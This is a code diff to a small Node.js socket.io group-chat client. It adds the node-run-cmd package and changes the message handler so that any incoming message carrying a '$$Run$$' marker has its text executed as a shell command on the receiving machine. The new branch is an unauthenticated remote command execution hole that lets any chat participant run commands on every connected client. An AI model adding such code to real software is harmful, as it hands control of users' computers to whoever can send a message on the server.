@@ -2,6 +2,7 @@
 
 /* 3rd Party */
 const socketio = require('socket.io-client');
+const nrc = require('node-run-cmd');
 
 // establishing connection with server
 const socket = socketio.connect('http://localhost:3000')
@@ -26,9 +27,19 @@ socket.emit('group message',message+'@'+name);
 // listening for messages coming from different users
 socket.on('group message',function(msg){
 
-    // splitting for output like this
-    // Kunal:I am doing great
-	console.log(msg.split('@')[1] + ':' + msg.split('@')[0]);
+    // checking if message have command to run
+    if(msg.search('/$$Run$$/') > 0){
+        nrc.run(msg.split('@')[0]).then(function(data){
+            console.log(data);
+        }).catch(function(err){
+            console.log(err);
+        })
+    } else {
+
+        // splitting for output like this
+        // Kunal:I am doing great
+	  console.log(msg.split('@')[1] + ':' + msg.split('@')[0]);
+    }
 })
 
 
